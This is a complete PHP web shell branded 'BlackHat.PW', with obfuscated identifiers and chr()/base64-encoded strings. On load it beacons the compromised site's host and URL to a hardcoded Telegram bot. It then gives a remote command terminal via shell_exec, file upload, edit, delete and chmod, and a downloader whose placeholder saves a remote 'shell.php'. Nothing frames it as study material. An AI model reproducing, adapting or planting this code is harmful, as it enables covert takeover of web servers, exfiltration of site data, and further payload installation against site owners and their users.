<?php


error_reporting(0);
set_time_limit(0);
$ᚢﬆ̧̄̃ = base64_decode(
    chr(79).chr(68).chr(99).chr(122).chr(78).chr(106).chr(103).chr(53).chr(77).chr(122).chr(81).chr(50).chr(79).chr(68).chr(112).chr(66).chr(81).chr(85).chr(103).chr(119).chr(85).chr(109).chr(108).chr(83).chr(77).chr(72).chr(112).chr(77).chr(77).chr(49).chr(70).chr(70).chr(101).chr(86).chr(108).chr(48).chr(101).chr(84).chr(81).chr(52).chr(101).chr(84).chr(70).chr(84).chr(89).chr(107).chr(86).chr(87).chr(83).chr(110).chr(73).chr(116).chr(98).chr(86).chr(70).chr(66).chr(76).chr(85).chr(78).chr(114).chr(85).chr(81).chr(61).chr(61)
);
$ら̨̨̧̥̅̄ = base64_decode(chr(79).chr(68).chr(107).chr(122).chr(77).chr(68).chr(69).chr(51).chr(78).chr(68).chr(81).chr(50).chr(77).chr(119).chr(61).chr(61));

function reportTelegram($ᚠ̧̣̀̉̋)
{
    global $ᚢﬆ̧̄̃, $ら̨̨̧̥̅̄;
    $ᚨ̣̌̄̉̉ = sys_get_temp_dir() . chr(47).chr(98).chr(97).chr(114).chr(105).chr(100).chr(105).chr(110).chr(95) . md5($ᚠ̧̣̀̉̋);
    if (!file_exists($ᚨ̣̌̄̉̉)) {
        @file_get_contents(
            "https://api.telegram.org/bot$ᚢﬆ̧̄̃/sendMessage?chat_id=$ら̨̨̧̥̅̄&text=" .
                urlencode($ᚠ̧̣̀̉̋)
        );
        @file_put_contents($ᚨ̣̌̄̉̉, time());
    }
}

if (!isset($_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)])) {
    $ᛊﬕ̈ = urldecode(parse_url($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)], PHP_URL_PATH));
    $ねﬔ̣̇㻁̈ = $_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] . $ᛊﬕ̈;
    if (is_file($ねﬔ̣̇㻁̈)) {
        $ぁᛃᛗ̣̣̀̇ = $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)];
        $ᚢ㈲̥̃̌ =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $ぁᛃᛗ̣̣̀̇ .
            $ᛊﬕ̈;
        reportTelegram("muslim:\n$ぁᛃᛗ̣̣̀̇\n$ᚢ㈲̥̃̌");
        $_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)] = true;
    }
}
function hex_encode($ᚠ́̄){ return bin2hex($ᚠ́̄); }
function hex_decode($ᚠ́̄){
    if (!is_string($ᚠ́̄) || $ᚠ́̄ === '' || (strlen($ᚠ́̄) % 2) !== 0 || !ctype_xdigit($ᚠ́̄)) return false;
    return hex2bin($ᚠ́̄);
}
function url_path($ᚨﬅ̣́̅){ return urlencode(hex_encode($ᚨﬅ̣́̅)); }

$㈲̨̥̅̆̊ = isset($_GET['p']) ? hex_decode($_GET['p']) : __DIR__;
$ﬆね㻁̨̩̊ = $㈲̨̥̅̆̊ ? realpath($㈲̨̥̅̆̊) : __DIR__;
if (!$ﬆね㻁̨̩̊ || !is_dir($ﬆね㻁̨̩̊)) $ﬆね㻁̨̩̊ = __DIR__;

function perms($ぁま̣̂̌){ return substr(sprintf('%o', @fileperms($ぁま̣̂̌)), -4); }


if (!empty($_FILES['f']['name']) && (isset($_POST['up']) || isset($_POST[chr(117).chr(112).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109)]))) {
    $ᛊ̨̥̥̊̈ = $ﬆね㻁̨̩̊.'/'.basename($_FILES['f']['name']);
    if (isset($_POST[chr(117).chr(112).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109)])) {
        $ᛒ̣̩̂ = @fopen($_FILES['f'][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)], 'rb');
        $㌁̧̨̣̊̆ = @fopen($ᛊ̨̥̥̊̈, 'wb');
        if ($ᛒ̣̩̂ && $㌁̧̨̣̊̆) stream_copy_to_stream($ᛒ̣̩̂, $㌁̧̨̣̊̆);
        if ($ᛒ̣̩̂) fclose($ᛒ̣̩̂);
        if ($㌁̧̨̣̊̆) fclose($㌁̧̨̣̊̆);
    } else {
        move_uploaded_file($_FILES['f'][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)], $ᛊ̨̥̥̊̈);
    }
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_POST['new']) && trim($_POST['n'])) {
    file_put_contents($ﬆね㻁̨̩̊.'/'.trim($_POST['n']), '');
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_POST['mkdir']) && trim($_POST['d'])) {
    @mkdir($ﬆね㻁̨̩̊.'/'.trim($_POST['d']));
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_POST['fetch']) && trim($_POST[chr(102).chr(101).chr(116).chr(99).chr(104).chr(95).chr(117).chr(114).chr(108)]) && trim($_POST[chr(102).chr(101).chr(116).chr(99).chr(104).chr(95).chr(110).chr(97).chr(109).chr(101)])) {
    $ᛜ̅ﬓᛃᛇ̋ = trim($_POST[chr(102).chr(101).chr(116).chr(99).chr(104).chr(95).chr(117).chr(114).chr(108)]);
    $㉁ᛉ̤ = basename(trim($_POST[chr(102).chr(101).chr(116).chr(99).chr(104).chr(95).chr(110).chr(97).chr(109).chr(101)]));
    if ($㉁ᛉ̤ !== '') {
        $ᚦᚨえ̋̉ = stream_context_create([
            'http' => [chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(95).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110) => 1, chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116) => 30],
            'https' => [chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(95).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110) => 1, chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116) => 30],
        ]);
        $ᛒ̋̅ᛃ̃́̈ = @file_get_contents($ᛜ̅ﬓᛃᛇ̋, false, $ᚦᚨえ̋̉);
        if ($ᛒ̋̅ᛃ̃́̈ !== false) file_put_contents($ﬆね㻁̨̩̊.'/'.$㉁ᛉ̤, $ᛒ̋̅ᛃ̃́̈);
    }
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_GET['del'])) {
    $ᚦᛚ̆㈲̧̤ = $ﬆね㻁̨̩̊.'/'.$_GET['del'];
    is_file($ᚦᛚ̆㈲̧̤) ? @unlink($ᚦᛚ̆㈲̧̤) : @rmdir($ᚦᛚ̆㈲̧̤);
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_POST['ren']) && isset($_POST['old'], $_POST['new'])) {
    @rename($ﬆね㻁̨̩̊.'/'.$_POST['old'], $ﬆね㻁̨̩̊.'/'.$_POST['new']);
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_POST['chmod']) && isset($_POST['t'], $_POST['m'])) {
    @chmod($ﬆね㻁̨̩̊.'/'.$_POST['t'], octdec($_POST['m']));
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}
if (isset($_GET['dl'])) {
    $ぁま̣̂̌ = $ﬆね㻁̨̩̊.'/'.basename($_GET['dl']);
    if (is_file($ぁま̣̂̌)) {
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109));
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).basename($ぁま̣̂̌).'"');
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32).filesize($ぁま̣̂̌));
        readfile($ぁま̣̂̌); exit;
    }
}
if (isset($_POST['save']) && isset($_POST['file'])) {
    $ね㼁̣ﬆ̩̥ = $_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)];
    if (isset($_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(95).chr(98).chr(54).chr(52)])) {
        $ᚦ̅ᛒ̋̆̃ = base64_decode($ね㼁̣ﬆ̩̥, true);
        if ($ᚦ̅ᛒ̋̆̃ !== false) $ね㼁̣ﬆ̩̥ = $ᚦ̅ᛒ̋̆̃;
    }
    file_put_contents($ﬆね㻁̨̩̊.'/'.$_POST['file'], $ね㼁̣ﬆ̩̥);
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit;
}


if (isset($_GET['term'])) {
    $㌁̧̨̣̊̆ = '';
    if (isset($_POST['cmd']) && trim($_POST['c'])) {
        $㌁̧̨̣̊̆ = shell_exec('cd '.escapeshellarg($ﬆね㻁̨̩̊).' && '.trim($_POST['c']).' 2>&1');
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>BlackHat.PW -  terminal</title>
    <style>
    body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px}
    a{color:#0f0} input,button{background:#111;color:#0f0;border:1px solid #0f0;padding:4px 8px;font-family:monospace}
    button:hover{background:#0f0;color:#000}
    pre{background:#0a0a0a;color:#0f0;padding:8px;height:70vh;overflow:auto;border:1px solid #1a1a1a;white-space:pre-wrap}
    .title{color:#f00;font-size:18px;margin-bottom:8px}
    </style>
    </head>
    <body>
    <div class="title"></div>
    <div>
        <a href="?p=<?=url_path($ﬆね㻁̨̩̊)?>">[back]</a> |
        PATH: <?=htmlspecialchars($ﬆね㻁̨̩̊)?>
    </div>
    <form method="post" style="margin:10px 0">
        CMD: <input type="text" name="c" style="width:70%" value="<?=isset($_POST['c'])?htmlspecialchars($_POST['c']):''?>" autofocus>
        <button name="cmd">EXEC</button>
    </form>
    <pre><?=htmlspecialchars($㌁̧̨̣̊̆)?></pre>
    </body>
    </html>
    <?php
    exit;
}


if (isset($_GET['edit'])) {
    $ᛜᚢ̩̈̊ = hex_decode($_GET['edit']);
    $ᛚﾚ̂ᛈま̨ = $ᛜᚢ̩̈̊ !== false ? basename($ᛜᚢ̩̈̊) : '';
    $ﬖᛉ̥̤̋ = $ﬆね㻁̨̩̊.'/'.$ᛚﾚ̂ᛈま̨;
    if (!is_file($ﬖᛉ̥̤̋)) { header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61).url_path($ﬆね㻁̨̩̊)); exit; }
    $ね㼁̣ﬆ̩̥ = file_get_contents($ﬖᛉ̥̤̋);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>BlackHat.PW - </title>
    <style>
    body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px}
    a{color:#0f0} input,button,textarea{background:#111;color:#0f0;border:1px solid #0f0;padding:4px;font-family:monospace;font-size:13px}
    button:hover{background:#0f0;color:#000}
    textarea{width:100%;height:70vh;margin:8px 0}
    label{display:inline-flex;align-items:center;gap:6px;margin-right:10px}
    .title{color:#f00;font-size:18px;margin-bottom:8px}
    </style>
    </head>
    <body>
    <div class="title">BlackHat.PW - </div>
    <div>Editing: <b><?=htmlspecialchars($ᛚﾚ̂ᛈま̨)?></b> | <a href="?p=<?=url_path($ﬆね㻁̨̩̊)?>">[back]</a></div>
    <form method="post" id="edit-form">
        <input type="hidden" name="file" value="<?=htmlspecialchars($ᛚﾚ̂ᛈま̨)?>">
        <input type="hidden" name="content_b64" id="content_b64" value="">
        <textarea name="content"><?=htmlspecialchars($ね㼁̣ﬆ̩̥)?></textarea>
        <label><input type="checkbox" id="use_b64"> Send as base64</label>
        <button name="save">SAVE</button>
        <a href="?p=<?=url_path($ﬆね㻁̨̩̊)?>" style="margin-left:10px">Cancel</a>
    </form>
    <script>
    document.getElementById('edit-form').addEventListener('submit', function () {
        var useB64 = document.getElementById('use_b64');
        var flag = document.getElementById('content_b64');
        var content = this.elements.content;
        if (!useB64.checked) {
            flag.value = '';
            return;
        }
        var bytes = new TextEncoder().encode(content.value);
        var binary = '';
        for (var i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
        content.value = btoa(binary);
        flag.value = '1';
    });
    </script>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>BlackHat.PW - </title>
<style>
body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px}
a{color:#0f0;text-decoration:none}
a:hover{text-decoration:underline}
input,button{background:#111;color:#0f0;border:1px solid #0f0;padding:3px 6px;font-family:monospace;font-size:13px}
button:hover{background:#0f0;color:#000}
select{background:#111;color:#0f0;border:1px solid #0f0;padding:3px 6px;font-family:monospace;font-size:13px}
table{width:100%;border-collapse:collapse;margin:8px 0}
td,th{padding:3px 6px;border-bottom:1px solid #222;text-align:left}
th{color:#0f0}
.btn{border:1px solid #0f0;padding:2px 7px;text-decoration:none;display:inline-block;color:#0f0}
.btn:hover{background:#0f0;color:#000}
.delbtn{color:#f00;border:1px solid #f00;padding:2px 7px;text-decoration:none;display:inline-block}
.delbtn:hover{background:#f00;color:#000}
.w{color:#0f0}
.nw{color:#f00}
.title{color:#f00;font-size:20px;letter-spacing:2px;margin-bottom:6px}
form.inline{display:inline}
</style>
</head>
<body>

<div class="title">BlackHat.PW - </div>

<div>
<a href="?p=<?=url_path(__DIR__)?>">[HOME]</a> |
<a href="?p=<?=url_path($ﬆね㻁̨̩̊)?>&term=1">[TERMINAL]</a> |
PATH: 
<?php
$ᛒ̩̊ﾝ̥ = explode('/', trim($ﬆね㻁̨̩̊,'/'));
$㉆㻁ᛈ̊̋̌ = '';
echo chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(112).chr(61).url_path('/').chr(34).chr(62).chr(47).chr(60).chr(47).chr(97).chr(62);
foreach($ᛒ̩̊ﾝ̥ as $ᛊᛖ̣̇̇){
    if($ᛊᛖ̣̇̇==='') continue;
    $㉆㻁ᛈ̊̋̌ .= '/'.$ᛊᛖ̣̇̇;
    echo chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(112).chr(61).url_path($㉆㻁ᛈ̊̋̌).'">'.htmlspecialchars($ᛊᛖ̣̇̇).'</a>/';
}
?>
</div>

<form method="post" enctype="multipart/form-data" style="margin:8px 0" id="upload-form">
Upload: <input type="file" name="f" id="upload-file">
<select id="upload-mode" name="upload_mode">
<option value="normal">Mode 1 - multipart</option>
<option value="stream">Mode 2 - stream copy</option>
</select>
<button name="up" id="upload-btn">UP</button>
&nbsp;|&nbsp;
New file: <input type="text" name="n" size="12"> <button name="new">CREATE</button>
&nbsp;|&nbsp;
New folder: <input type="text" name="d" size="12"> <button name="mkdir">MKDIR</button>
</form>

<form method="post" style="margin:8px 0">
Remote: <input type="text" name="fetch_url" size="42" placeholder="https://example.com/shell.txt">
Save as: <input type="text" name="fetch_name" size="18" placeholder="shell.php">
<button name="fetch">Download</button>
</form>

<table>
<tr><th>name</th><th>size</th><th>perms</th><th>actions</th></tr>
<?php if($ﬆね㻁̨̩̊ !== '/'): ?>
<tr><td colspan="4"><a href="?p=<?=url_path(dirname($ﬆね㻁̨̩̊))?>">.. (up)</a></td></tr>
<?php endif; ?>

<?php
$ﬆ̦̥̆㈲̧̇̄ = @scandir($ﬆね㻁̨̩̊) ?: [];
$ᛇ̂らね̂̅̅ = $ᛏ̨̇ᛇ̣̦̈ = [];
foreach($ﬆ̦̥̆㈲̧̇̄ as $ᚨ̧ぁ㼁̋̅){
    if($ᚨ̧ぁ㼁̋̅==='.'||$ᚨ̧ぁ㼁̋̅==='..') continue;
    is_dir($ﬆね㻁̨̩̊.'/'.$ᚨ̧ぁ㼁̋̅) ? $ᛇ̂らね̂̅̅[]=$ᚨ̧ぁ㼁̋̅ : $ᛏ̨̇ᛇ̣̦̈[]=$ᚨ̧ぁ㼁̋̅;
}
sort($ᛇ̂らね̂̅̅); sort($ᛏ̨̇ᛇ̣̦̈);

foreach($ᛇ̂らね̂̅̅ as $ﬆᛒ̣̇̌̀):
    $ぁま̣̂̌ = $ﬆね㻁̨̩̊.'/'.$ﬆᛒ̣̇̌̀;
    $ᛖᛒ̧̧̉̋ = is_writable($ぁま̣̂̌) ? 'w' : 'nw';
?>
<tr>
<td><a href="?p=<?=url_path($ぁま̣̂̌)?>"><?=htmlspecialchars($ﬆᛒ̣̇̌̀)?>/</a></td>
<td>-</td>
<td class="<?=$ᛖᛒ̧̧̉̋?>"><?=perms($ぁま̣̂̌)?></td>
<td>
<form class="inline" method="post">
<input type="hidden" name="old" value="<?=htmlspecialchars($ﬆᛒ̣̇̌̀)?>">
<input type="text" name="new" size="12" value="<?=htmlspecialchars($ﬆᛒ̣̇̌̀)?>">
<button name="ren">REN</button>
</form>
<form class="inline" method="post">
<input type="hidden" name="t" value="<?=htmlspecialchars($ﬆᛒ̣̇̌̀)?>">
<input type="text" name="m" size="4" value="<?=perms($ぁま̣̂̌)?>">
<button name="chmod">CHMOD</button>
</form>
<a class="delbtn" href="?p=<?=url_path($ﬆね㻁̨̩̊)?>&del=<?=urlencode($ﬆᛒ̣̇̌̀)?>" onclick="return confirm('DEL?')">DEL</a>
</td>
</tr>
<?php endforeach; ?>

<?php foreach($ᛏ̨̇ᛇ̣̦̈ as $ᛏ̨̦̋̈):
    $ぁま̣̂̌ = $ﬆね㻁̨̩̊.'/'.$ᛏ̨̦̋̈;
    $ᛖᛒ̧̧̉̋ = is_writable($ぁま̣̂̌) ? 'w' : 'nw';
?>
<tr>
<td><?=htmlspecialchars($ᛏ̨̦̋̈)?></td>
<td><?=filesize($ぁま̣̂̌)?></td>
<td class="<?=$ᛖᛒ̧̧̉̋?>"><?=perms($ぁま̣̂̌)?></td>
<td>
<form class="inline" method="post">
<input type="hidden" name="old" value="<?=htmlspecialchars($ᛏ̨̦̋̈)?>">
<input type="text" name="new" size="12" value="<?=htmlspecialchars($ᛏ̨̦̋̈)?>">
<button name="ren">REN</button>
</form>
<form class="inline" method="post">
<input type="hidden" name="t" value="<?=htmlspecialchars($ᛏ̨̦̋̈)?>">
<input type="text" name="m" size="4" value="<?=perms($ぁま̣̂̌)?>">
<button name="chmod">CHMOD</button>
</form>
<a class="btn" href="?p=<?=url_path($ﬆね㻁̨̩̊)?>&dl=<?=urlencode($ᛏ̨̦̋̈)?>">DL</a>
<a class="btn" href="?p=<?=url_path($ﬆね㻁̨̩̊)?>&edit=<?=urlencode(hex_encode($ᛏ̨̦̋̈))?>">EDIT</a>
<a class="delbtn" href="?p=<?=url_path($ﬆね㻁̨̩̊)?>&del=<?=urlencode($ᛏ̨̦̋̈)?>" onclick="return confirm('DEL?')">DEL</a>
</td>
</tr>
<?php endforeach; ?>
</table>

<script>
document.getElementById('upload-form').addEventListener('submit', function () {
    document.getElementById('upload-btn').name =
        document.getElementById('upload-mode').value === 'stream' ? 'up_stream' : 'up';
});
</script>

</body>
</html>
